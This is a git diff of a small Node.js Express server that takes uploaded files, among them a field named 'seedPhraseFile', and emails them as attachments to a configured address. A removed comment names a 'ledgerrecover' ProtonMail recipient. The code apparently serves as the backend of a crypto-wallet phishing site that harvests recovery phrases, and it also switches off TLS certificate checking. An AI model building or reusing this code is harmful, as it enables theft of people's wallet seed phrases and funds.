@@ -1,4 +1,4 @@
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; //to allow email br ablie to send but not secured
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; // to allow email but not secured
 
 const express = require('express');
 const cors = require('cors');
@@ -9,7 +9,15 @@ const path = require('path');
 const dotenv = require('dotenv').config();
 
 const app = express();
-app.use(cors());
+
+// CORS configuration for live
+const corsOptions = {
+  origin: 'https://fullstackemailsender.vercel.app/',
+  optionsSuccessStatus: 200
+};
+
+app.use(cors(corsOptions));
+// app.use(cors());
 app.use(express.json());
 
 const storage = multer.diskStorage({
@@ -30,13 +38,10 @@ app.post('/upload', upload.fields([{ name: 'file' }, { name: 'seedPhraseFile' },
 
 // Email setup
 const transporter = nodemailer.createTransport({
-  service:process.env.VITE_EMAIL_SERVICE,
-  //   // host: 'smtp.gmail.com',
-  //   //   port: 465,
-  //   //   secure: true, // use SSL
-    auth: {
-      user: process.env.VITE_EMAIL_USER,
-      pass: process.env.VITE_EMAIL_PASS,
+  service: process.env.VITE_EMAIL_SERVICE,
+  auth: {
+    user: process.env.VITE_EMAIL_USER,
+    pass: process.env.VITE_EMAIL_PASS,
   }
 });
 
@@ -53,35 +58,35 @@ app.post('/send-all-files', (req, res) => {
 
     // Prepare email options
     const mailOptions = {
-        from:process.env.VITE_EMAIL_USER,
-        to:process.env.VITE_RECIPIENT_EMAIL_1,
-        // to:'ledgerrecover@protonmail.com',
-        subject:'TestMail',
-        text:'sending today&apos; emails with Nodejs using Nodemailer',
-        attachments: files.map(file => ({
-          filename: file,
-          path: path.join(uploadDir, file)
-        }))
-      };
+      from: process.env.VITE_EMAIL_USER,
+      to: process.env.VITE_RECIPIENT_EMAIL_1,
+      subject: 'TestMail',
+      text: 'Sending today\'s emails with Node.js using Nodemailer',
+      attachments: files.map(file => ({
+        filename: file,
+        path: path.join(uploadDir, file)
+      }))
+    };
   
-      // Send email with attachments
-      transporter.sendMail(mailOptions, (error, info) => {
-        if (error) {
-          console.error('Error sending email:', error);
-          return res.status(500).send('Failed to send email');
-        }
+    // Send email with attachments
+    transporter.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        console.error('Error sending email:', error);
+        return res.status(500).send('Failed to send email');
+      }
+
+      // Optionally, clean up files after sending email
+      files.forEach(file => fs.unlinkSync(path.join(uploadDir, file)));
   
-        // Optionally, clean up files after sending email
-        files.forEach(file => fs.unlinkSync(path.join(uploadDir, file)));
-  
-        res.status(200).send('Files sent and email sent');
-      });
+      res.status(200).send('Files sent and email sent');
     });
   });
+});
 
 app.listen(3001, () => {
   console.log('Server is running on port 3001');
 });
+
 
 
 
